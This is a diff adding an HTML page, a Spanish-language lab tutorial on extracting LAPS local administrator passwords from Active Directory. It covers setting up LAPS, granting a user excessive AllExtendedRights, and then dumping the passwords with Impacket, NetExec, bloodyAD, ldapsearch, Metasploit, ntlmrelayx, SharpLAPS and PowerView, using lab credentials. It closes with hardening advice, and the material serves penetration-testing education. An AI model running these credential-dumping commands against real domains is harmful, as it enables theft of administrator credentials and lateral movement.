+        <strong>Configuración de Contraseña:</strong> Establecer en Habilitado<br>
+        <strong>Complejidad de Contraseña</strong> → Letras mayúsculas + letras minúsculas + números + caracteres especiales<br>
+        <strong>Longitud de Contraseña</strong> → Establecer longitud (por defecto: 14).<br>
+        <strong>Antigüedad de Contraseña (Días)</strong> → Definir la expiración (por ejemplo, 30 días).</p>
+
+        <p>Habilite <strong>Nombre de cuenta de administrador para gestionar</strong> → Establecer en Habilitado. Y establezca el nombre de la cuenta de administrador, en este caso, <strong>ieuser</strong>.</p>
+
+        <p>Habilite <strong>Gestión de contraseñas de administrador local</strong> → establecer en Habilitado.</p>
+
+        <div class="page-number">8 | Página</div>
+
+        <h2>Volcado de Credenciales LAPS</h2>
+        <p>Para que todos los cambios en la política estén activos, necesitamos realizar una actualización de Directiva de Grupo como se muestra en la imagen a continuación:</p>
+        <pre><code>Microsoft Windows [Version 10.0.17763.292]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Administrator>gpupdate /force
+Actualizando política...
+
+La actualización de la política de equipo se ha completado correctamente.</code></pre>
+
+        <h2 id="extender-esquema-ad">Extender el Esquema de AD para LAPS</h2>
+        <p>Abra PowerShell como Administrador en el DC y ejecute el siguiente comando para actualizar el esquema:</p>
+        <pre><code>powershell -ep bypass
+Import-Module AdmPwd.PS
+Update-AdmPwdADSchema</code></pre>
+        <p>Esto creará dos nuevos atributos en Active Directory (AD):</p>
+        <ul>
+            <li>ms-MCS-AdmPwd → Almacena la contraseña de administrador local.</li>
+            <li>ms-MCS-AdmPwdExpirationTime → Almacena el tiempo de expiración de la contraseña.</li>
+        </ul>
+
+        <h2 id="permisos-ad">Establecer Permisos de AD</h2>
+        <p><strong>Permitir que las Computadoras Actualicen Sus Propias Contraseñas</strong></p>
+        <pre><code>Set-AdmPwdComputerSelfPermission -OrgUnit Tech</code></pre>
+        <p><strong>Conceder Acceso a los Administradores para Ver Contraseñas</strong></p>
+        <pre><code>Set-AdmPwdReadPasswordPermission -OrgUnit Tech -AllowedPrincipals Administrators</code></pre>
+
+        <div class="page-number">9 | Página</div>
+
+        <h2>Volcado de Credenciales LAPS</h2>
+        <p>Ejemplo de salida de PowerShell:</p>
+        <pre><code>PS C:\Users\Administrator> powershell -ep bypass
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\Administrator> Import-Module AdmPwd.PS
+PS C:\Users\Administrator> Update-AdmPwdADSchema
+
+Operación                                  DistinguishedName                                        Estado
+---------                                  -----------------                                        ------
+AddSchemaAttribute                         CN=ms-MCS-AdmPwdExpirationTime,CN=Schema,CN=Configurati... Éxito
+AddSchemaAttribute                         CN=ms-MCS-AdmPwd,CN=Schema,CN=Configuration,DC=ignite,... Éxito
+ModifySchemaClass                          CN=Computer,CN=Schema,CN=Configuration,DC=ignite,DC=local Éxito
+
+PS C:\Users\Administrator> Set-AdmPwdComputerSelfPermission -OrgUnit Tech
+
+Nombre    DistinguishedName                Estado
+------    -----------------                ------
+Tech      OU=Tech,DC=ignite,DC=local      Delegado
+
+PS C:\Users\Administrator> Set-AdmPwdReadPasswordPermission -OrgUnit Tech -AllowedPrincipals Administrators
+
+Nombre    DistinguishedName                Estado
+------    -----------------                ------
+Tech      OU=Tech,DC=ignite,DC=local      Delegado</code></pre>
+
+        <h2 id="desplegar-laps-clientes">Desplegar LAPS a Máquinas Cliente</h2>
+        <p>Instale LAPS en todas las máquinas cliente mediante GPO, SCCM o instalación manual.</p>
+        <p>Asegúrese de que el agente de LAPS esté ejecutándose ejecutando:</p>
+        <pre><code>gpupdate /force</code></pre>
+
+        <div class="page-number">10 | Página</div>
+
+        <h2>Volcado de Credenciales LAPS</h2>
+        <p>Ejemplo de salida:</p>
+        <pre><code>Microsoft Windows [Version 10.0.17763.379]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\raj>gpupdate /force
+Actualizando política...
+
+La actualización de la política de equipo se ha completado correctamente.
+La actualización de la política de usuario se ha completado correctamente.
+
+C:\Users\raj></code></pre>
+
+        <h2 id="probar-laps">Probar LAPS</h2>
+        <p>Ahora, para asegurarse de que funciona correctamente, verifiquemos la contraseña asignada por LAPS a la Máquina Cliente (MSEDGEWIN10) en sus propiedades. Como puede observar en la imagen a continuación, LAPS ha asignado una contraseña aleatoria a la Máquina Cliente (MSEDGEWIN10).</p>
+        <p>Abra Usuarios y Equipos de Active Directory (ADUC) en el Controlador de Dominio.</p>
+        <p>Localice la Máquina Cliente (MSEDGEWIN10) en la OU Tech.</p>
+        <p>En sus propiedades, haga clic en Editor de atributos.</p>
+        <p>Debería ver el atributo <strong>ms-Mcs-AdmPwd</strong> con una contraseña generada aleatoriamente.</p>
+
+        <h2 id="modelo-seguridad-laps">Comprender el Modelo de Seguridad de LAPS:</h2>
+        <p><strong>Intro:</strong> Configurar un usuario (raj) para recuperar contraseñas gestionadas por LAPS desde AD. Esto no es un ataque en sí mismo—es una acción administrativa legítima si la realiza un administrador autorizado. Sin embargo, si un atacante obtiene control de la cuenta raj o realiza estos pasos sin autorización, podría conducir a un <strong>ataque de escalada de privilegios</strong> o <strong>robo de credenciales</strong> de las siguientes maneras:</p>
+
+        <p>Crear el Usuario de Dominio</p>
+        <p>Cree una cuenta de usuario de AD llamada Raj.</p>
+        <pre><code>net user raj Password@1 /add /domain</code></pre>
+
+        <p>LAPS almacena las contraseñas de administrador local en el atributo ms-Mcs-AdmPwd, que está protegido por defecto. Solo grupos específicos (por ejemplo, Administradores de Dominio) o usuarios delegados explícitamente pueden leerlo.</p>
+        <p>La cuenta win1 no tenía permiso para leer este atributo, por lo que está creando un nuevo usuario (raj) y otorgando los permisos mínimos necesarios para recuperar las contraseñas de LAPS.</p>
+
+        <h2 id="usuario-dominio-allextendedrights">Añadir un nuevo usuario de dominio a la Máquina Cliente con Permiso AllExtendedRights.</h2>
+        <p>Abra ADUC. Navegue a <strong>OU Tech</strong> bajo el dominio. Debería ver la <strong>Máquina Cliente (MSEDGEWIN10)</strong> listada, haga clic derecho en ella y vaya a <strong>propiedades</strong>.</p>
+        <p>Vaya a la pestaña <strong>Seguridad</strong> y haga clic en el botón <strong>Agregar</strong>.</p>
+        <p>En el cuadro "Ingrese el nombre del objeto para seleccionar", escriba <strong>raj</strong> y haga clic en <strong>Comprobar nombres</strong> y luego en Aceptar.</p>
+        <p>Seleccione el usuario <strong>Raj</strong> y haga clic en la opción <strong>avanzada</strong>.</p>
+        <p>En la sección Permisos, marque la casilla para el permiso <strong>Todos los derechos extendidos</strong>.</p>
+        <p>Aplique la configuración.</p>
+
+        <div class="page-number">11 | Página</div>
+
+        <h2>Volcado de Credenciales LAPS</h2>
+        <h3 id="explicacion-allextendedrights">Explicación: Todos los Derechos Extendidos:</h3>
+        <ul>
+            <li>"Todos los derechos extendidos" incluye permisos adicionales, como la capacidad de leer atributos sensibles o realizar operaciones específicas de AD (por ejemplo, restablecimientos de contraseña).</li>
+            <li>Para LAPS, el derecho extendido específico necesario a menudo está vinculado a leer ms-Mcs-AdmPwd o atributos relacionados (por ejemplo, ms-Mcs-AdmPwdExpirationTime). Sin embargo, otorgar "Todos los derechos extendidos" es más amplio de lo necesario—es un comodín que incluye el derecho requerido pero también otorga otros permisos innecesarios (por ejemplo, restablecer la contraseña de la computadora).</li>
+            <li>Está agregando esto porque algunas implementaciones de LAPS o herramientas (como impacket-GetLAPSPassword) podrían requerir derechos adicionales más allá de solo "Leer" para consultar el atributo con éxito, dependiendo del esquema o configuración de AD.</li>
+        </ul>
+        <p>Ahora hemos terminado con la configuración del entorno de laboratorio para LAPS en Windows.</p>
+
+        <h2 id="fase-explotacion">Fase de Explotación</h2>
+        <h3 id="bloodhound-permisos">Bloodhound – Búsqueda de Permisos Débiles</h3>
+        <h4 id="explicacion-bloodhound">Explicación de BloodHound</h4>
+        <p><strong>Usar BloodHound para Confirmar Privilegios:</strong> Puede usar <strong>BloodHound</strong> para verificar que <strong>Raj</strong> tiene el permiso <strong>AllExtendedRights</strong> para la <strong>Máquina Cliente (MSEDGEWIN10)</strong>.</p>
+        <pre><code>bloodhound-python -u raj -p Password@1 -ns 192.168.1.48 -d ignite.local -c All</code></pre>
+        <p>Desde la representación gráfica de Bloodhound, el evaluador querría identificar el control de objetos salientes para el usuario seleccionado donde el primer grado de valor de control de objetos es igual a 1.</p>
+        <p>Puede ver el resultado, el usuario Raj tiene Todos los derechos extendidos.</p>
+        <p>Si navega a la sección de ayuda, encontrará la explicación sobre qué vulnerabilidades podría tener esta configuración y cómo puede atacar aprovechando esto.</p>
+
+        <h2 id="metodo-explotacion-t1003">Método de Explotación - Volcado de Credenciales (T1003)</h2>
+        <p>Usemos varias otras herramientas para realizar el ataque y recuperar la contraseña de administrador local, que es establecida por la herramienta LAPS.</p>
+        <h3 id="impacket">Impacket</h3>
+        <p>El conjunto de herramientas Impacket es una colección de bibliotecas y scripts de Python diseñados para trabajar con protocolos de red, particularmente aquellos utilizados en entornos Windows, como SMB, Kerberos, LDAP y NTLM.</p>
+        <pre><code>impacket-GetLAPSPassword ignite.local/raj:Password@1 -dc-ip 192.168.1.48</code></pre>
+
+        <div class="page-number">12 | Página</div>
+
+        <h2>Volcado de Credenciales LAPS</h2>
+        <h3>Herramienta NXC</h3>
+        <p>NXC, abreviatura de NetExec, es una herramienta basada en Python que automatiza la explotación de servicios de red como SMB, LDAP, WinRM, RDP, WMI, MSSQL y más. Está diseñada para agilizar las pruebas de penetración internas al proporcionar una interfaz unificada para interactuar con protocolos Windows, muy similar a Impacket, pero con un enfoque en soporte multiprotocolo y extensiones modulares.</p>
+        <pre><code>nxc ldap "192.168.1.48" -d "ignite.local" -u "raj" -p "Password@1" --module laps</code></pre>
+
+        <h3>PyLaps</h3>
+        <p>GitHub - p0dalirius/pyLAPS: Setter/Getter de Python para la propiedad ms-Mcs-AdmPwd utilizada por LAPS.</p>
+        <p>Este script es un setter/getter de Python para la propiedad ms-Mcs-AdmPwd utilizada por LAPS, inspirado en SharpLAPS de @swisskyrepo en C#.</p>
+        <p>Clonar el repositorio:</p>
+        <pre><code>git clone https://github.com/p0dalirius/pyLAPS
+cd pyLAPS
+chmod 777 pyLAPS.py</code></pre>
+        <p>Ejecutar el script</p>
+        <pre><code>./pyLAPS.py --action get -d "192.168.1.48" -u "raj" -p "Password@1"</code></pre>
+
+        <h3>LAPSDumper</h3>
+        <p>GitHub - n00py/LAPSDumper: Volcado de LAPS desde Python</p>
+        <p>Clonar el repositorio:</p>
+        <pre><code>git clone https://github.com/n00py/LAPSDumper
+cd LAPSDumper
+chmod 777 laps.py</code></pre>
+        <p>Ejecutar el script</p>
+        <pre><code>python laps.py -u 'raj' -p 'Password@1' -d 'ignite.local'</code></pre>
+
+        <div class="page-number">13 | Página</div>
+
+        <h2>Volcado de Credenciales LAPS</h2>
+        <h3>BloodyAD</h3>
+        <p>BloodyAD es un framework de escalada de privilegios de Active Directory (AD) de código abierto diseñado para ayudar a profesionales de seguridad, probadores de penetración y equipos rojos a identificar y explotar rutas de escalada de privilegios dentro de entornos AD.</p>
+        <pre><code>bloodyAD --host "192.168.1.48" -d "ignite.local" -u "raj" -p "Password@1" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime</code></pre>
+
+        <h3>Ldapsearch</h3>
+        <p>ldapsearch es una herramienta de línea de comandos utilizada para consultar y recuperar información de un servicio de directorio LDAP (Lightweight Directory Access Protocol), como Active Directory (AD) o un servidor OpenLDAP. Es parte de la suite de software OpenLDAP y es ampliamente utilizada por administradores de sistemas, profesionales de seguridad y probadores de penetración para interactuar con directorios LDAP, extraer datos (por ejemplo, cuentas de usuario, membresías de grupo o atributos como contraseñas LAPS) y solucionar problemas relacionados con el directorio. ldapsearch le permite realizar búsquedas basadas en filtros, recuperar atributos específicos y autenticarse en el directorio utilizando varios métodos.</p>
+        <pre><code>ldapsearch -x -H ldap://192.168.1.48 -D "raj@ignite.local" -w "Password@1" -b "dc=ignite,dc=local" "(&(objectCategory=computer)(ms-MCS-AdmPwd=*))" ms-MCS-AdmPwd</code></pre>
+
+        <h3>Metasploit: ldap_query</h3>
+        <p>Este módulo (auxiliary/gather/ldap_query) permite a los usuarios consultar un servidor LDAP usando una consulta LDAP personalizada o un conjunto de consultas LDAP bajo una categoría específica.</p>
+        <pre><code>use auxiliary/gather/ldap_query
+set rhosts 192.168.1.48
+set username raj
+set password Password@1
+set domain ignite.local
+set action ENUM_LAPS_PASSWORDS
+run</code></pre>
+
+        <h3>Impacket-ntlmrelayx</h3>
+        <p>Este módulo realiza los ataques de Relay SMB descubiertos originalmente por cDc, extendidos a muchos protocolos objetivo (SMB, MSSQL, LDAP, etc.)</p>
+        <p>Alternativamente, el ntlmrelayx de Impacket también tiene esa característica, utilizable con --dump-laps.</p>
+        <pre><code>impacket-ntlmrelayx -t ldaps://192.168.1.48 -debug --dump-laps --no-dump --no-da --no-acl --no-validate-privs</code></pre>
+
+        <div class="page-number">14 | Página</div>
+
+        <h2>Volcado de Credenciales LAPS</h2>
+        <p>Después de una breve espera, recibimos una conexión HTTP desde la cuenta del usuario Raj junto con la contraseña de LAPS.</p>
+
+        <h3>ldap_shell</h3>
+        <p>Este proyecto es un fork de ldap_shell de Impacket. Proporciona una shell interactiva para la enumeración y manipulación de Active Directory a través de protocolos LDAP/LDAPS, haciéndolo útil tanto para administradores de sistemas como para profesionales de seguridad.</p>
+        <p>Esto también se puede lograr usando ldap_shell:</p>
+        <p>Clonar el repositorio e instalar:</p>
+        <pre><code>git clone https://github.com/PShlyundin/ldap_shell
+cd ldap_shell
+python3 -m pipx install .</code></pre>
+        <p>Use la opción get_laps_gmsa después de obtener una shell como el usuario raj.</p>
+        <pre><code>ldap_shell ignite.local/raj:Password@1 -dc-ip 192.168.1.48</code></pre>
+
+        <h2>Explotación en Windows</h2>
+        <h3>PowerShell</h3>
+        <p>Descargar Get-LAPSPasswords</p>
+        <pre><code>Powershell -ep bypass
+Import-Module .\Get-LAPSPasswords.ps1
+Get-LAPSPasswords -DomainController 192.168.1.48 -Credential IGNITE\raj | Format-Table -Autosize</code></pre>
+
+        <h3>NetTools</h3>
+        <p>Descargar | NetTools</p>
+        <p>NetTools es una herramienta gratuita de solución de problemas de Active Directory, que proporciona la capacidad de solucionar problemas, consultar, informar y actualizar Active Directory y otros directorios basados en LDAP.</p>
+
+        <div class="page-number">15 | Página</div>
+
+        <h2>Volcado de Credenciales LAPS</h2>
+        <p>Dentro de NetTools, puede navegar para ver los atributos de la computadora, incluida la contraseña de LAPS.</p>
+
+        <h3>Sharplaps</h3>
+        <p>Descargar Sharplaps</p>
+        <p>Este ejecutable está hecho para ejecutarse dentro de una sesión de Cobalt Strike usando execute-assembly. Recuperará la contraseña de LAPS de Active Directory.</p>
+        <pre><code>C:\Users\raj\Downloads>SharpLAPS.exe /user:IGNITE\raj /pass:Password@1 /host:192.168.1.48</code></pre>
+
+        <h3>Metasploit: enum_laps</h3>
+        <p>Este módulo (post/windows/gather/credentials/enum_laps) recuperará las contraseñas de LAPS (Solución de Contraseñas de Administrador Local), configuradas en Active Directory, a las que generalmente solo pueden acceder usuarios privilegiados. Tenga en cuenta que el nombre de la cuenta de administrador local no se almacena en Active Directory, por lo que se supone que es 'Administrador' por defecto.</p>
+        <pre><code>use post/windows/gather/credentials/enum_laps
+set session 1
+run</code></pre>
+
+        <h3>Powerview</h3>
+        <p>PowerView es una herramienta de PowerShell para obtener conciencia situacional de la red en dominios Windows.</p>
+        <p>Descargar Powerview</p>
+        <pre><code>Import-Module \PowerView.ps1
+Get-DomainComputer MSEDGEWIN10 -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime</code></pre>
+
+        <h3>Explorador de Active Directory – Sysinternals</h3>
+        <p>Explorador de Active Directory (AD Explorer) es un visor y editor avanzado de Active Directory (AD). Puede usar AD Explorer para navegar fácilmente por una base de datos de AD, definir ubicaciones favoritas, ver propiedades y atributos de objetos sin tener que abrir cuadros de diálogo, editar permisos, ver el esquema de un objeto y ejecutar búsquedas sofisticadas que puede guardar y volver a ejecutar.</p>
+        <p>AD Explorer - Sysinternals | Microsoft Learn</p>
+
+        <div class="page-number">16 | Página</div>
+
+        <h2 id="conclusion">Conclusión</h2>
+        <h3 id="mejores-practicas-laps">Mejores Prácticas para la Seguridad de LAPS:</h3>
+        <ul>
+            <li><strong>Mínimo Privilegio:</strong> Otorgar acceso de lectura a ms-Mcs-AdmPwd solo a grupos específicos (por ejemplo, Lectores de LAPS), no a usuarios individuales como raj.</li>
+            <li><strong>Actualizar a Windows LAPS:</strong> Si es posible, migrar a Windows LAPS para cifrado e integración con Azure AD.</li>
+            <li><strong>Auditoría Regular:</strong> Usar herramientas como NetTools, BloodHound y PowerShell para auditar el acceso a LAPS semanalmente.</li>
+            <li><strong>Monitorear Registros:</strong> Habilitar la auditoría de AD y revisar el Visor de Eventos para detectar intentos de acceso no autorizado.</li>
+            <li><strong>Proteger Credenciales:</strong> Proteger cuentas como raj con contraseñas fuertes y autenticación multifactor (MFA) si es posible.</li>
+            <li><strong>Probar con Herramientas:</strong> Usar Impacket, NXC, BloodyAD y ldapsearch para simular ataques y validar defensas.</li>
+            <li><strong>Parchear y Actualizar:</strong> Asegurarse de que los controladores de dominio (ignite.local) y los clientes (MSEdgeWin10) estén parcheados para mitigar vulnerabilidades.</li>
+        </ul>
+
+        <h3 id="resumen-puntos-clave">Resumen de Puntos Clave</h3>
+        <ul>
+            <li>LAPS es una herramienta crítica para gestionar contraseñas de administrador local, reduciendo los riesgos de reutilización de credenciales en ignite.local.</li>
+            <li>La gestión adecuada de permisos (por ejemplo, limitar el acceso de Raj) previene ataques de recuperación de contraseñas de LAPS, como se vio con impacket-GetLAPSPassword.</li>
+            <li>Herramientas como BloodHound, NXC y BloodyAD ayudan a identificar y explotar vulnerabilidades de LAPS, mientras que NetTools y ldapsearch ayudan en la verificación manual.</li>
+            <li>El fortalecimiento de los permisos de AD, la habilitación del cifrado y la auditoría de acceso son esenciales para asegurar las implementaciones de LAPS.</li>
+            <li>Las pruebas regulares en un entorno de laboratorio (ignite.local) aseguran una seguridad robusta de LAPS antes del despliegue en producción.</li>
+        </ul>
+
+        <h3 id="notas">Notas</h3>
+        <ul>
+            <li><strong>Contexto del Laboratorio:</strong> El contenido está adaptado a su laboratorio (ignite.local, OU=Lab_machines,OU=ScrollLab), centrándose en pasos prácticos para Raj y MSEdgeWin10.</li>
+            <li><strong>Integración de Herramientas:</strong> Incorpora su uso de BloodHound (por ejemplo, identificando los permisos de raj), Impacket (por ejemplo, GetLAPSPassword), NXC, BloodyAD, ldapsearch y NetTools para una estrategia de defensa integral.</li>
+            <li><strong>Enfoque de Seguridad:</strong> Enfatiza el principio de mínimo privilegio y la auditoría, abordando los "Todos los derechos extendidos" excesivamente permisivos que otorgó a raj.</li>
+            <li><strong>Windows LAPS:</strong> Destaca la función de cifrado de Windows LAPS, que no está disponible en LAPS legacy, alentando una actualización para una mejor seguridad.</li>
+        </ul>
+
+
+    </div>
+
+    <footer style="text-align: center; padding: 30px; margin-top: 50px; border-top: 1px solid #4a5568; background: linear-gradient(145deg, #2a2a4e 0%, #1e1e3e 100%); border-radius: 0 0 12px 12px;">
+        <a href="pildoras.html" style="color: #b8c5d1; text-decoration: none; font-weight: bold; font-size: 16px; padding: 10px 20px; border: 1px solid #5a67d8; border-radius: 6px; background: linear-gradient(145deg, #4a5568 0%, #2d3748 100%); transition: all 0.3s ease;">
+            ← Volver a Píldoras
+        </a>
+    </footer>
+</body>
+</html>
